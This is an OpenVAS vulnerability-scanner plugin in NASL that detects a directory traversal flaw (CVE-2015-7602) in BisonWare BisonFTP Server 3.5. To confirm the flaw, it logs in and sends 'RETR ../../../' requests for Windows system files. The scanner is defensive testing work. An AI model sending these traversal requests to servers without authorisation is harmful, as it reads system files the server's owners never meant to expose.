###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_bisonware_bisonftp_server_dir_trav_vuln.nasl 13517 2019-02-07 07:51:12Z mmartin $
#
# BisonWare BisonFTP Server Directory Traversal Vulnerability
#
# Authors:
# Deependra Bapna <bdeependra@secpod.com>
#
# Copyright:
# Copyright (c) 2015 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:bisonware:bison_ftp_server";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.805753");
  script_version("$Revision: 13517 $");
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:N/A:N");
  script_tag(name:"last_modification", value:"$Date: 2019-02-07 08:51:12 +0100 (Thu, 07 Feb 2019) $");
  script_tag(name:"creation_date", value:"2015-09-29 12:41:58 +0530 (Tue, 29 Sep 2015)");
  script_cve_id("CVE-2015-7602");
  script_name("BisonWare BisonFTP Server Directory Traversal Vulnerability");

  script_tag(name:"summary", value:"This host is running BisonWare BisonFTP Server
  and is prone to directory traversal vulnerability.");

  script_tag(name:"vuldetect", value:"Send the crafted directory traversal attack
  request and check whether it is able to read the system file or not.");

  script_tag(name:"insight", value:"The flaw exists due to error in handling of
  file names. It does not properly sanitise filenames containing directory traversal
  sequences that are received from an FTP server.");

  script_tag(name:"impact", value:"Successful exploitation will allow attackers
  to read arbitrary files on the affected application.");

  script_tag(name:"affected", value:"BisonWare BisonFTP Server version 3.5.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability.
  Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the
  product or replace the product by another one.");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_tag(name:"qod_type", value:"remote_vul");

  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/38341");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2015 Greenbone Networks GmbH");
  script_family("FTP");
  script_dependencies("gb_bisonware_bisonftp_server_detect.nasl");
  script_mandatory_keys("BisonWare/Ftp/Installed");
  script_require_ports("Services/ftp", 21);
  exit(0);
}

include("ftp_func.inc");
include("host_details.inc");
include("misc_func.inc");

ftpPort = get_app_port(cpe:CPE);
if(!ftpPort){
  exit(0);
}

soc = open_sock_tcp(ftpPort);
if(!soc){
  exit(0);
}

kb_creds = ftp_get_kb_creds();
user = kb_creds["login"];
pass = kb_creds["pass"];

login_details = ftp_log_in(socket:soc, user:user, pass:pass);
if(!login_details)
{
 close(soc);
 exit(0);
}

ftpPort2 = ftp_get_pasv_port(socket:soc);
if(!ftpPort2)
{
  close(soc);
  exit(0);
}

soc2 = open_sock_tcp(ftpPort2, transport:get_port_transport(ftpPort));
if(!soc2)
{
  close(soc);
  exit(0);
}

files = traversal_files( "Windows" );

foreach pattern( keys( files ) ) {

  file = files[pattern];
  file = "../../../" + file;
  req = string("RETR ", file);
  send(socket:soc, data:string(req, "\r\n"));

  res = ftp_recv_data(socket:soc2);

  if( res && match = egrep( string:res, pattern:"(" + pattern + "|\WINDOWS)", icase:TRUE ) ) {
    report  = "Used request:  " + req + '\n';
    report += "Received data: " + match;
    security_message(port:ftpPort, data:report);
    close(soc2);
    close(soc);
    exit(0);
  }
}

close(soc);
close(soc2);